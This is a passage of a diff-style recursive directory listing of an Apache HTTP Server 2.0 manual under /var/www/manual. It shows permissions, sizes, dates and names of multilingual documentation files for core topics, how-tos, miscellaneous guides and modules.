+-rw-r--r--   1 root root  22K Feb 20  2004 env.html.en
+-rw-r--r--   1 root root  22K Jul 29  2004 env.html.ja.euc-jp
+-rw-r--r--   1 root root  20K May  7  2004 env.html.ko.euc-kr
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 faq
+-rw-r--r--   1 root root  438 Jul 29  2004 filter.html
+-rw-r--r--   1 root root 6.5K Apr 25  2004 filter.html.en
+-rw-r--r--   1 root root 6.7K Apr 25  2004 filter.html.es
+-rw-r--r--   1 root root 6.5K Jul 29  2004 filter.html.ja.euc-jp
+-rw-r--r--   1 root root 6.2K May  7  2004 filter.html.ko.euc-kr
+-rw-r--r--   1 root root 6.7K May  2  2004 filter.html.ru.koi8-r
+-rw-r--r--   1 root root  266 Apr 25  2004 glossary.html
+-rw-r--r--   1 root root  21K Sep 12  2004 glossary.html.en
+-rw-r--r--   1 root root  23K Sep 12  2004 glossary.html.es
+-rw-r--r--   1 root root  19K Sep 22  2004 glossary.html.ko.euc-kr
+-rw-r--r--   1 root root  443 Jul 29  2004 handler.html
+-rw-r--r--   1 root root 9.4K Apr 25  2004 handler.html.en
+-rw-r--r--   1 root root  10K Apr 25  2004 handler.html.es
+-rw-r--r--   1 root root 9.5K Jul 29  2004 handler.html.ja.euc-jp
+-rw-r--r--   1 root root 8.7K May  7  2004 handler.html.ko.euc-kr
+-rw-r--r--   1 root root  11K Apr 25  2004 handler.html.ru.koi8-r
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 howto
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 images
+-rw-r--r--   1 root root  518 Jul 29  2004 index.html
+-rw-r--r--   1 root root 7.2K Sep  4  2004 index.html.de
+-rw-r--r--   1 root root 7.1K Sep  4  2004 index.html.en
+-rw-r--r--   1 root root 7.5K Sep  4  2004 index.html.es
+-rw-r--r--   1 root root 7.1K Sep  4  2004 index.html.ja.euc-jp
+-rw-r--r--   1 root root 6.8K Sep  4  2004 index.html.ko.euc-kr
+-rw-r--r--   1 root root 7.2K Sep  4  2004 index.html.ru.koi8-r
+-rw-r--r--   1 root root  530 Jul 29  2004 install.html
+-rw-r--r--   1 root root  22K Apr 25  2004 install.html.de
+-rw-r--r--   1 root root  21K Apr 25  2004 install.html.en
+-rw-r--r--   1 root root  23K Apr 25  2004 install.html.es
+-rw-r--r--   1 root root  20K Sep  4  2004 install.html.ja.euc-jp
+-rw-r--r--   1 root root  18K May  7  2004 install.html.ko.euc-kr
+-rw-r--r--   1 root root  30K May  2  2004 install.html.ru.koi8-r
+-rw-r--r--   1 root root  536 Jul 29  2004 invoking.html
+-rw-r--r--   1 root root  11K Apr 25  2004 invoking.html.de
+-rw-r--r--   1 root root 9.6K Apr 25  2004 invoking.html.en
+-rw-r--r--   1 root root  11K Apr 25  2004 invoking.html.es
+-rw-r--r--   1 root root 9.5K Jul 29  2004 invoking.html.ja.euc-jp
+-rw-r--r--   1 root root 8.5K May  7  2004 invoking.html.ko.euc-kr
+-rw-r--r--   1 root root  11K May  2  2004 invoking.html.ru.koi8-r
+-rw-r--r--   1 root root   86 Jul  5  2003 license.html
+-rw-r--r--   1 root root  14K Feb 20  2004 license.html.en
+-rw-r--r--   1 root root  257 Jul 29  2004 logs.html
+-rw-r--r--   1 root root  31K Feb 20  2004 logs.html.en
+-rw-r--r--   1 root root  30K Jul 29  2004 logs.html.ja.euc-jp
+-rw-r--r--   1 root root  27K May  7  2004 logs.html.ko.euc-kr
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 misc
+drwxr-xr-x   3 root root  12K Oct  7  2009 mod
+-rw-r--r--   1 root root  423 Jul 29  2004 mpm.html
+-rw-r--r--   1 root root 7.8K Apr 25  2004 mpm.html.en
+-rw-r--r--   1 root root 8.3K Apr 25  2004 mpm.html.es
+-rw-r--r--   1 root root 7.8K Jul 29  2004 mpm.html.ja.euc-jp
+-rw-r--r--   1 root root 7.0K May  7  2004 mpm.html.ko.euc-kr
+-rw-r--r--   1 root root 8.4K May  2  2004 mpm.html.ru.koi8-r
+-rw-r--r--   1 root root  680 Jul 29  2004 new_features_2_0.html
+-rw-r--r--   1 root root  15K May 18  2004 new_features_2_0.html.de
+-rw-r--r--   1 root root  14K May 18  2004 new_features_2_0.html.en
+-rw-r--r--   1 root root  15K May 18  2004 new_features_2_0.html.es
+-rw-r--r--   1 root root 4.3K Jan 22  2004 new_features_2_0.html.fr
+-rw-r--r--   1 root root  14K Jul 29  2004 new_features_2_0.html.ja.euc-jp
+-rw-r--r--   1 root root  13K May 18  2004 new_features_2_0.html.ko.euc-kr
+-rw-r--r--   1 root root  15K May 18  2004 new_features_2_0.html.ru.koi8-r
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 platform
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 programs
+-rw-r--r--   1 root root  269 Jul 29  2004 sections.html
+-rw-r--r--   1 root root  25K Feb 20  2004 sections.html.en
+-rw-r--r--   1 root root  25K Jul 29  2004 sections.html.ja.euc-jp
+-rw-r--r--   1 root root  23K May  7  2004 sections.html.ko.euc-kr
+-rw-r--r--   1 root root  278 Jul 29  2004 server-wide.html
+-rw-r--r--   1 root root 8.4K Feb 20  2004 server-wide.html.en
+-rw-r--r--   1 root root 8.3K Jul 29  2004 server-wide.html.ja.euc-jp
+-rw-r--r--   1 root root 7.8K Feb 20  2004 server-wide.html.ko.euc-kr
+-rw-r--r--   1 root root  440 Jul 29  2004 sitemap.html
+-rw-r--r--   1 root root  17K Aug 15  2004 sitemap.html.de
+-rw-r--r--   1 root root  17K Aug 15  2004 sitemap.html.en
+-rw-r--r--   1 root root  18K Aug 15  2004 sitemap.html.es
+-rw-r--r--   1 root root  17K Sep  4  2004 sitemap.html.ja.euc-jp
+-rw-r--r--   1 root root  16K Aug 15  2004 sitemap.html.ko.euc-kr
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 ssl
+-rw-r--r--   1 root root  536 Jul 29  2004 stopping.html
+-rw-r--r--   1 root root  17K Apr 25  2004 stopping.html.de
+-rw-r--r--   1 root root  15K Apr 25  2004 stopping.html.en
+-rw-r--r--   1 root root  17K Apr 25  2004 stopping.html.es
+-rw-r--r--   1 root root  15K Jul 29  2004 stopping.html.ja.euc-jp
+-rw-r--r--   1 root root  13K Apr 25  2004 stopping.html.ko.euc-kr
+-rw-r--r--   1 root root  17K May  2  2004 stopping.html.ru.koi8-r
+drwxr-xr-x   6 root root 4.0K Oct  7  2009 style
+-rw-r--r--   1 root root  263 Jul 29  2004 suexec.html
+-rw-r--r--   1 root root  26K Jun  8  2004 suexec.html.en
+-rw-r--r--   1 root root  25K Sep  4  2004 suexec.html.ja.euc-jp
+-rw-r--r--   1 root root  22K Jul  9  2004 suexec.html.ko.euc-kr
+-rw-r--r--   1 root root  631 Jul 29  2004 upgrading.html
+-rw-r--r--   1 root root  14K Aug 29  2004 upgrading.html.de
+-rw-r--r--   1 root root  14K Aug 29  2004 upgrading.html.en
+-rw-r--r--   1 root root  14K Aug 19  2004 upgrading.html.es
+-rw-r--r--   1 root root 6.4K Apr 23  2003 upgrading.html.fr
+-rw-r--r--   1 root root  13K Sep  4  2004 upgrading.html.ja.euc-jp
+-rw-r--r--   1 root root  12K Sep  6  2004 upgrading.html.ko.euc-kr
+-rw-r--r--   1 root root  13K May 18  2004 upgrading.html.ru.koi8-r
+-rwxr-xr-x   1 root root  275 Jul 29  2004 urlmapping.html
+-rwxr-xr-x   1 root root  19K Feb 20  2004 urlmapping.html.en
+-rw-r--r--   1 root root  19K Jul 29  2004 urlmapping.html.ja.euc-jp
+-rw-r--r--   1 root root  17K May  7  2004 urlmapping.html.ko.euc-kr
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 vhosts
+
+/var/www/manual/developer:
+total 308K
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root   82 Jul  5  2003 API.html
+-rw-r--r--   1 root root  62K Feb 20  2004 API.html.en
+-rw-r--r--   1 root root   88 Jul  5  2003 debugging.html
+-rw-r--r--   1 root root 9.5K Feb 20  2004 debugging.html.en
+-rw-r--r--   1 root root   90 Jul  5  2003 documenting.html
+-rw-r--r--   1 root root 4.7K Feb 20  2004 documenting.html.en
+-rw-r--r--   1 root root   86 Jul  5  2003 filters.html
+-rw-r--r--   1 root root  13K Feb 20  2004 filters.html.en
+-rw-r--r--   1 root root   84 Jul  5  2003 hooks.html
+-rw-r--r--   1 root root  11K Feb 20  2004 hooks.html.en
+-rw-r--r--   1 root root   84 Jul  5  2003 index.html
+-rw-r--r--   1 root root 4.7K Feb 20  2004 index.html.en
+-rw-r--r--   1 root root  176 Jul 29  2004 modules.html
+-rw-r--r--   1 root root  12K Jul 29  2004 modules.html.en
+-rw-r--r--   1 root root  12K Sep  4  2004 modules.html.ja.euc-jp
+-rw-r--r--   1 root root   86 Jul  5  2003 request.html
+-rw-r--r--   1 root root  15K Feb 20  2004 request.html.en
+-rw-r--r--   1 root root   92 Jul  5  2003 thread_safety.html
+-rw-r--r--   1 root root  16K Feb 20  2004 thread_safety.html.en
+
+/var/www/manual/faq:
+total 144K
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root  182 May  7  2004 all_in_one.html
+-rw-r--r--   1 root root  11K May  7  2004 all_in_one.html.en
+-rw-r--r--   1 root root  11K May  7  2004 all_in_one.html.ko.euc-kr
+-rw-r--r--   1 root root  172 May  7  2004 error.html
+-rw-r--r--   1 root root 5.0K May  7  2004 error.html.en
+-rw-r--r--   1 root root 4.8K May  7  2004 error.html.ko.euc-kr
+-rw-r--r--   1 root root  172 May  7  2004 index.html
+-rw-r--r--   1 root root 3.5K May  7  2004 index.html.en
+-rw-r--r--   1 root root 3.3K May  7  2004 index.html.ko.euc-kr
+-rw-r--r--   1 root root  176 May  7  2004 support.html
+-rw-r--r--   1 root root 7.4K May  7  2004 support.html.en
+-rw-r--r--   1 root root 7.0K May  7  2004 support.html.ko.euc-kr
+
+/var/www/manual/howto:
+total 476K
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root  257 Jul 29  2004 auth.html
+-rw-r--r--   1 root root  21K Jul 29  2004 auth.html.en
+-rw-r--r--   1 root root  21K Sep  4  2004 auth.html.ja.euc-jp
+-rw-r--r--   1 root root  18K Jul 29  2004 auth.html.ko.euc-kr
+-rw-r--r--   1 root root  254 Jul 29  2004 cgi.html
+-rw-r--r--   1 root root  28K Jul  9  2004 cgi.html.en
+-rw-r--r--   1 root root  27K Sep  4  2004 cgi.html.ja.euc-jp
+-rw-r--r--   1 root root  24K Jul  9  2004 cgi.html.ko.euc-kr
+-rwxr-xr-x   1 root root  269 Sep  4  2004 htaccess.html
+-rw-r--r--   1 root root  21K Sep  4  2004 htaccess.html.en
+-rw-r--r--   1 root root  20K Sep  4  2004 htaccess.html.ja.euc-jp
+-rw-r--r--   1 root root  18K Sep  4  2004 htaccess.html.ko.euc-kr
+-rw-r--r--   1 root root  260 Sep  4  2004 index.html
+-rw-r--r--   1 root root 5.6K Sep  4  2004 index.html.en
+-rw-r--r--   1 root root 5.5K Sep  4  2004 index.html.ja.euc-jp
+-rw-r--r--   1 root root 5.2K Sep  4  2004 index.html.ko.euc-kr
+-rw-r--r--   1 root root  278 Sep  4  2004 public_html.html
+-rw-r--r--   1 root root 9.0K Sep  4  2004 public_html.html.en
+-rw-r--r--   1 root root 8.8K Sep  4  2004 public_html.html.ja.euc-jp
+-rw-r--r--   1 root root 8.4K Sep  4  2004 public_html.html.ko.euc-kr
+-rw-r--r--   1 root root  254 Jul 29  2004 ssi.html
+-rw-r--r--   1 root root  24K Jul  9  2004 ssi.html.en
+-rw-r--r--   1 root root  23K Sep  4  2004 ssi.html.ja.euc-jp
+-rw-r--r--   1 root root  20K Jul  9  2004 ssi.html.ko.euc-kr
+
+/var/www/manual/images:
+total 220K
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root 4.0K Nov  1  2000 apache_header.gif
+-rw-r--r--   1 root root  23K Feb  5  1998 custom_errordocs.gif
+-rw-r--r--   1 root root  23K Apr  2  2004 custom_errordocs.png
+-rwxr-xr-x   1 root root   56 Sep  5  2002 down.gif
+-rwxr-xr-x   1 root root 1.1K Sep  5  2002 favicon.ico
+-rwxr-xr-x   1 root root 6.4K Sep  5  2002 feather.gif
+-rw-r--r--   1 root root 6.2K Apr  2  2004 feather.png
+-rw-r--r--   1 root root 1.5K Nov 21  1996 home.gif
+-rw-r--r--   1 root root 1.6K Nov 21  1996 index.gif
+-rwxr-xr-x   1 root root   60 Sep  5  2002 left.gif
+-rw-r--r--   1 root root 3.5K Mar  4  1998 mod_rewrite_fig1.gif
+-rw-r--r--   1 root root 5.5K Apr  2  2004 mod_rewrite_fig1.png
+-rw-r--r--   1 root root 2.5K Mar  4  1998 mod_rewrite_fig2.gif
+-rw-r--r--   1 root root 4.1K Apr  2  2004 mod_rewrite_fig2.png
+-rw-r--r--   1 root root   61 Nov  1  2000 pixel.gif
+-rwxr-xr-x   1 root root   59 Sep  5  2002 right.gif
+-rw-r--r--   1 root root 6.0K Nov 21  1996 sub.gif
+-rwxr-xr-x   1 root root   57 Sep  5  2002 up.gif
+
+/var/www/manual/misc:
+total 572K
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root   95 Jul  5  2003 custom_errordocs.html
+-rw-r--r--   1 root root  25K Feb 20  2004 custom_errordocs.html.en
+-rw-r--r--   1 root root   90 Jul  5  2003 descriptors.html
+-rw-r--r--   1 root root  13K Feb 20  2004 descriptors.html.en
+-rw-r--r--   1 root root   89 Jul  5  2003 fin_wait_2.html
+-rw-r--r--   1 root root  21K Feb 20  2004 fin_wait_2.html.en
+-rw-r--r--   1 root root   84 Jul  5  2003 index.html
+-rw-r--r--   1 root root 5.4K Feb 20  2004 index.html.en
+-rw-r--r--   1 root root  100 Jul  5  2003 known_client_problems.html
+-rw-r--r--   1 root root  21K Feb 20  2004 known_client_problems.html.en
+-rw-r--r--   1 root root  184 May  7  2004 perf-tuning.html
+-rw-r--r--   1 root root  51K May  7  2004 perf-tuning.html.en
+-rw-r--r--   1 root root  45K May  7  2004 perf-tuning.html.ko.euc-kr
+-rw-r--r--   1 root root  198 May  7  2004 relevant_standards.html
+-rw-r--r--   1 root root 9.6K May  7  2004 relevant_standards.html.en
+-rw-r--r--   1 root root 8.7K May  7  2004 relevant_standards.html.ko.euc-kr
+-rw-r--r--   1 root root  186 May  7  2004 rewriteguide.html
+-rw-r--r--   1 root root  71K Aug 11  2004 rewriteguide.html.en
+-rw-r--r--   1 root root  63K Sep  6  2004 rewriteguide.html.ko.euc-kr
+-rw-r--r--   1 root root  188 May  7  2004 security_tips.html
+-rw-r--r--   1 root root  18K May  7  2004 security_tips.html.en
+-rw-r--r--   1 root root  16K May  7  2004 security_tips.html.ko.euc-kr
+-rw-r--r--   1 root root   88 Jul  5  2003 tutorials.html
+-rw-r--r--   1 root root  11K Feb 20  2004 tutorials.html.en
+
+/var/www/manual/mod:
+total 5.3M
+drwxr-xr-x   3 root root  12K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root  338 May  4  2004 beos.html
+-rw-r--r--   1 root root 7.3K May  4  2004 beos.html.de
+-rw-r--r--   1 root root 7.2K May  4  2004 beos.html.en
+-rw-r--r--   1 root root 7.6K May  4  2004 beos.html.es
+-rw-r--r--   1 root root 6.9K May  7  2004 beos.html.ko.euc-kr
+-rw-r--r--   1 root root  254 Sep  6  2004 core.html
+-rw-r--r--   1 root root 184K Sep 11  2004 core.html.de
+-rw-r--r--   1 root root 170K Sep  7  2004 core.html.en
+-rw-r--r--   1 root root 171K Sep  6  2004 core.html.ja.euc-jp
+-rw-r--r--   1 root root  381 Jul 29  2004 directive-dict.html
+-rw-r--r--   1 root root  16K Jul 12  2004 directive-dict.html.en
+-rw-r--r--   1 root root  17K Jul 12  2004 directive-dict.html.es
+-rw-r--r--   1 root root  15K Sep  6  2004 directive-dict.html.ja.euc-jp
+-rw-r--r--   1 root root  13K Sep  6  2004 directive-dict.html.ko.euc-kr
+-rw-r--r--   1 root root  548 Jul 29  2004 directives.html
+-rw-r--r--   1 root root  29K Aug 15  2004 directives.html.de
+-rw-r--r--   1 root root  29K Aug 15  2004 directives.html.en
+-rw-r--r--   1 root root  29K Aug 15  2004 directives.html.es
+-rw-r--r--   1 root root  29K Sep  6  2004 directives.html.ja.euc-jp
+-rw-r--r--   1 root root  28K Sep  6  2004 directives.html.ko.euc-kr
+-rw-r--r--   1 root root  29K Aug 15  2004 directives.html.ru.koi8-r
+-rw-r--r--   1 root root  430 Jul 29  2004 index.html
+-rw-r--r--   1 root root  14K Aug 11  2004 index.html.de
+-rw-r--r--   1 root root  14K Aug 11  2004 index.html.en
+-rw-r--r--   1 root root  14K Aug 11  2004 index.html.es
+-rw-r--r--   1 root root  13K Sep  6  2004 index.html.ja.euc-jp
+-rw-r--r--   1 root root  13K Sep 22  2004 index.html.ko.euc-kr
+-rw-r--r--   1 root root  346 May 18  2004 leader.html
+-rw-r--r--   1 root root 7.1K May 18  2004 leader.html.de
+-rw-r--r--   1 root root 6.8K May 18  2004 leader.html.en
+-rw-r--r--   1 root root 7.1K May 18  2004 leader.html.es
+-rw-r--r--   1 root root 6.6K May 18  2004 leader.html.ko.euc-kr
+-rw-r--r--   1 root root  182 Jul 29  2004 mod_access.html
+-rw-r--r--   1 root root  19K Feb 20  2004 mod_access.html.en
+-rw-r--r--   1 root root  18K Sep  6  2004 mod_access.html.ja.euc-jp
+-rw-r--r--   1 root root  278 Jul 29  2004 mod_actions.html
+-rw-r--r--   1 root root 8.9K Feb 20  2004 mod_actions.html.en
+-rw-r--r--   1 root root 9.0K Sep  6  2004 mod_actions.html.ja.euc-jp
+-rw-r--r--   1 root root 8.3K Jul  9  2004 mod_actions.html.ko.euc-kr
+-rw-r--r--   1 root root  272 Sep 22  2004 mod_alias.html
+-rw-r--r--   1 root root  22K Sep 22  2004 mod_alias.html.en
+-rw-r--r--   1 root root  23K Sep 22  2004 mod_alias.html.ja.euc-jp
+-rw-r--r--   1 root root  20K Sep 22  2004 mod_alias.html.ko.euc-kr
+-rw-r--r--   1 root root  269 Jul 29  2004 mod_asis.html
+-rw-r--r--   1 root root 5.9K Feb 20  2004 mod_asis.html.en
+-rw-r--r--   1 root root 6.0K Jul 29  2004 mod_asis.html.ja.euc-jp
+-rw-r--r--   1 root root 5.6K Feb 20  2004 mod_asis.html.ko.euc-kr
+-rw-r--r--   1 root root  178 Jul 29  2004 mod_auth.html
+-rw-r--r--   1 root root  13K Feb 20  2004 mod_auth.html.en
+-rw-r--r--   1 root root  14K Sep  6  2004 mod_auth.html.ja.euc-jp
+-rw-r--r--   1 root root   92 Jul  5  2003 mod_auth_anon.html
+-rw-r--r--   1 root root  15K Feb 20  2004 mod_auth_anon.html.en
+-rw-r--r--   1 root root   91 Jul  5  2003 mod_auth_dbm.html
+-rw-r--r--   1 root root  14K Feb 20  2004 mod_auth_dbm.html.en
+-rw-r--r--   1 root root  192 Sep 22  2004 mod_auth_digest.html
+-rw-r--r--   1 root root  23K Sep 22  2004 mod_auth_digest.html.en
+-rw-r--r--   1 root root  21K Sep 22  2004 mod_auth_digest.html.ko.euc-kr
+-rw-r--r--   1 root root   92 Jul  5  2003 mod_auth_ldap.html
+-rw-r--r--   1 root root  47K May 21  2004 mod_auth_ldap.html.en
+-rw-r--r--   1 root root  284 Jul 29  2004 mod_autoindex.html
+-rw-r--r--   1 root root  48K Mar 23  2004 mod_autoindex.html.en
+-rw-r--r--   1 root root  49K Sep  6  2004 mod_autoindex.html.ja.euc-jp
+-rw-r--r--   1 root root  44K May  7  2004 mod_autoindex.html.ko.euc-kr
+-rw-r--r--   1 root root  180 Jul  5  2003 mod_cache.html
+-rw-r--r--   1 root root  24K Feb 20  2004 mod_cache.html.en
+-rw-r--r--   1 root root  22K Feb 20  2004 mod_cache.html.ko.euc-kr
+-rw-r--r--   1 root root  188 Jul  5  2003 mod_cern_meta.html
+-rw-r--r--   1 root root 8.3K Feb 20  2004 mod_cern_meta.html.en
+-rw-r--r--   1 root root 7.7K Feb 20  2004 mod_cern_meta.html.ko.euc-kr
+-rw-r--r--   1 root root  266 Jul 29  2004 mod_cgi.html
+-rw-r--r--   1 root root  15K Feb 20  2004 mod_cgi.html.en
+-rw-r--r--   1 root root  15K Jul 29  2004 mod_cgi.html.ja.euc-jp
+-rw-r--r--   1 root root  14K Jul  9  2004 mod_cgi.html.ko.euc-kr
+-rw-r--r--   1 root root  269 Sep  6  2004 mod_cgid.html
+-rw-r--r--   1 root root 6.9K Sep  7  2004 mod_cgid.html.en
+-rw-r--r--   1 root root 6.8K Sep  6  2004 mod_cgid.html.ja.euc-jp
+-rw-r--r--   1 root root 6.4K Sep  7  2004 mod_cgid.html.ko.euc-kr
+-rw-r--r--   1 root root  194 Jul  5  2003 mod_charset_lite.html
+-rw-r--r--   1 root root  13K Feb 20  2004 mod_charset_lite.html.en
+-rw-r--r--   1 root root  12K Feb 20  2004 mod_charset_lite.html.ko.euc-kr
+-rw-r--r--   1 root root  266 Jul 29  2004 mod_dav.html
+-rw-r--r--   1 root root  16K Feb 20  2004 mod_dav.html.en
+-rw-r--r--   1 root root  16K Jul 29  2004 mod_dav.html.ja.euc-jp
+-rw-r--r--   1 root root  15K Feb 20  2004 mod_dav.html.ko.euc-kr
+-rw-r--r--   1 root root  275 Jul 29  2004 mod_dav_fs.html
+-rw-r--r--   1 root root 6.4K Feb 20  2004 mod_dav_fs.html.en
+-rw-r--r--   1 root root 5.8K Jul 29  2004 mod_dav_fs.html.ja.euc-jp
+-rw-r--r--   1 root root 6.1K Feb 20  2004 mod_dav_fs.html.ko.euc-kr
+-rwxr-xr-x   1 root root  278 Jul 29  2004 mod_deflate.html
+-rw-r--r--   1 root root  21K Mar 22  2004 mod_deflate.html.en
+-rw-r--r--   1 root root  20K Sep  6  2004 mod_deflate.html.ja.euc-jp
+-rw-r--r--   1 root root  19K May  7  2004 mod_deflate.html.ko.euc-kr
+-rw-r--r--   1 root root  266 Jul 29  2004 mod_dir.html
+-rw-r--r--   1 root root  11K Sep  4  2004 mod_dir.html.en
+-rw-r--r--   1 root root  11K Sep  6  2004 mod_dir.html.ja.euc-jp
+-rw-r--r--   1 root root 9.5K Sep  6  2004 mod_dir.html.ko.euc-kr
+-rw-r--r--   1 root root  190 Jul  5  2003 mod_disk_cache.html
+-rw-r--r--   1 root root  23K Feb 20  2004 mod_disk_cache.html.en
+-rw-r--r--   1 root root  21K Feb 20  2004 mod_disk_cache.html.ko.euc-kr
+-rw-r--r--   1 root root  269 Jul 29  2004 mod_echo.html
+-rw-r--r--   1 root root 4.8K Feb 20  2004 mod_echo.html.en
+-rw-r--r--   1 root root 4.8K Jul 29  2004 mod_echo.html.ja.euc-jp
+-rw-r--r--   1 root root 4.7K Feb 20  2004 mod_echo.html.ko.euc-kr
+-rw-r--r--   1 root root  266 Jul 29  2004 mod_env.html
+-rw-r--r--   1 root root 7.3K Feb 20  2004 mod_env.html.en
+-rw-r--r--   1 root root 7.2K Jul 29  2004 mod_env.html.ja.euc-jp
+-rw-r--r--   1 root root 6.9K Feb 20  2004 mod_env.html.ko.euc-kr
+-rw-r--r--   1 root root  184 May  7  2004 mod_example.html
+-rw-r--r--   1 root root 8.0K May  7  2004 mod_example.html.en
+-rw-r--r--   1 root root 7.3K May  7  2004 mod_example.html.ko.euc-kr
+-rw-r--r--   1 root root  278 Sep  6  2004 mod_expires.html
+-rw-r--r--   1 root root  14K Sep  7  2004 mod_expires.html.en
+-rw-r--r--   1 root root  14K Sep  6  2004 mod_expires.html.ja.euc-jp
+-rw-r--r--   1 root root  13K Sep  7  2004 mod_expires.html.ko.euc-kr
+-rw-r--r--   1 root root  190 May  7  2004 mod_ext_filter.html
+-rw-r--r--   1 root root  18K May  7  2004 mod_ext_filter.html.en
+-rw-r--r--   1 root root  16K May  7  2004 mod_ext_filter.html.ko.euc-kr
+-rw-r--r--   1 root root  190 May  7  2004 mod_file_cache.html
+-rw-r--r--   1 root root  13K May 21  2004 mod_file_cache.html.en
+-rw-r--r--   1 root root  12K Jul  9  2004 mod_file_cache.html.ko.euc-kr
+-rw-r--r--   1 root root   90 Jul  5  2003 mod_headers.html
+-rw-r--r--   1 root root  16K Aug 19  2004 mod_headers.html.en
+-rw-r--r--   1 root root  178 Sep 22  2004 mod_imap.html
+-rw-r--r--   1 root root  19K Sep 22  2004 mod_imap.html.en
+-rw-r--r--   1 root root  17K Sep 22  2004 mod_imap.html.ko.euc-kr
+-rw-r--r--   1 root root  184 Jul 29  2004 mod_include.html
+-rw-r--r--   1 root root  39K Sep  4  2004 mod_include.html.en
+-rw-r--r--   1 root root  38K Sep  6  2004 mod_include.html.ja.euc-jp
+-rw-r--r--   1 root root  178 Jul 29  2004 mod_info.html
+-rw-r--r--   1 root root 6.8K Feb 20  2004 mod_info.html.en
+-rw-r--r--   1 root root 6.8K Jul 29  2004 mod_info.html.ja.euc-jp
+-rw-r--r--   1 root root  180 Sep 22  2004 mod_isapi.html
+-rw-r--r--   1 root root  21K Sep 22  2004 mod_isapi.html.en
+-rw-r--r--   1 root root  19K Sep 22  2004 mod_isapi.html.ko.euc-kr
+-rw-r--r--   1 root root   87 Jul  5  2003 mod_ldap.html
+-rw-r--r--   1 root root  23K Sep 21  2004 mod_ldap.html.en
+-rw-r--r--   1 root root  287 Sep 22  2004 mod_log_config.html
+-rw-r--r--   1 root root  25K Sep 22  2004 mod_log_config.html.en
+-rw-r--r--   1 root root  24K Sep 22  2004 mod_log_config.html.ja.euc-jp
+-rw-r--r--   1 root root  22K Sep 22  2004 mod_log_config.html.ko.euc-kr
+-rw-r--r--   1 root root   95 Apr 12  2004 mod_log_forensic.html
+-rw-r--r--   1 root root 9.9K Apr 12  2004 mod_log_forensic.html.en
+-rw-r--r--   1 root root  272 Sep  6  2004 mod_logio.html
+-rw-r--r--   1 root root 5.2K Sep  7  2004 mod_logio.html.en
+-rw-r--r--   1 root root 5.2K Sep  6  2004 mod_logio.html.ja.euc-jp
+-rw-r--r--   1 root root 4.9K Sep  7  2004 mod_logio.html.ko.euc-kr
+-rw-r--r--   1 root root  188 Sep 22  2004 mod_mem_cache.html
+-rw-r--r--   1 root root  16K Sep 22  2004 mod_mem_cache.html.en
+-rw-r--r--   1 root root  15K Sep 22  2004 mod_mem_cache.html.ko.euc-kr
+-rw-r--r--   1 root root  178 Jul 29  2004 mod_mime.html
+-rw-r--r--   1 root root  57K Sep  4  2004 mod_mime.html.en
+-rw-r--r--   1 root root  56K Sep  6  2004 mod_mime.html.ja.euc-jp
+-rw-r--r--   1 root root   93 Jul  5  2003 mod_mime_magic.html
+-rw-r--r--   1 root root  14K Apr  3  2004 mod_mime_magic.html.en
+-rw-r--r--   1 root root  192 Jul 29  2004 mod_negotiation.html
+-rw-r--r--   1 root root  18K Sep  4  2004 mod_negotiation.html.en
+-rw-r--r--   1 root root  17K Sep  6  2004 mod_negotiation.html.ja.euc-jp
+-rw-r--r--   1 root root   89 Jul  5  2003 mod_nw_ssl.html
+-rw-r--r--   1 root root 6.7K Jul 15  2004 mod_nw_ssl.html.en
+-rw-r--r--   1 root root   88 Jul  5  2003 mod_proxy.html
+-rw-r--r--   1 root root  58K Feb 20  2004 mod_proxy.html.en
+-rw-r--r--   1 root root   96 Jul  5  2003 mod_proxy_connect.html
+-rw-r--r--   1 root root 4.1K Feb 20  2004 mod_proxy_connect.html.en
+-rw-r--r--   1 root root   92 Jul  5  2003 mod_proxy_ftp.html
+-rw-r--r--   1 root root 3.9K Feb 20  2004 mod_proxy_ftp.html.en
+-rw-r--r--   1 root root   93 Jul  5  2003 mod_proxy_http.html
+-rw-r--r--   1 root root 4.3K Feb 20  2004 mod_proxy_http.html.en
+drwxr-xr-x   3 root root 4.0K Oct  7  2009 mod_python
+-rw-r--r--   1 root root   90 Jul  5  2003 mod_rewrite.html
+-rw-r--r--   1 root root  83K Aug 27  2004 mod_rewrite.html.en
+-rw-r--r--   1 root root  281 Jul 29  2004 mod_setenvif.html
+-rw-r--r--   1 root root  16K Aug 19  2004 mod_setenvif.html.en
+-rw-r--r--   1 root root  15K Sep  6  2004 mod_setenvif.html.ja.euc-jp
+-rw-r--r--   1 root root  14K Sep  6  2004 mod_setenvif.html.ko.euc-kr
+-rw-r--r--   1 root root  263 Jul 29  2004 mod_so.html
+-rw-r--r--   1 root root  11K May  7  2004 mod_so.html.en
+-rw-r--r--   1 root root  11K Jul 29  2004 mod_so.html.ja.euc-jp
+-rw-r--r--   1 root root 9.3K May  7  2004 mod_so.html.ko.euc-kr
+-rw-r--r--   1 root root  278 Jul 29  2004 mod_speling.html
+-rw-r--r--   1 root root 6.9K May  7  2004 mod_speling.html.en
+-rw-r--r--   1 root root 7.0K Sep  6  2004 mod_speling.html.ja.euc-jp
+-rw-r--r--   1 root root 6.2K May  7  2004 mod_speling.html.ko.euc-kr
+-rw-r--r--   1 root root   86 Jul  5  2003 mod_ssl.html
+-rw-r--r--   1 root root  95K Apr 12  2004 mod_ssl.html.en
+-rw-r--r--   1 root root  275 Sep  6  2004 mod_status.html
+-rw-r--r--   1 root root 8.5K Sep  7  2004 mod_status.html.en
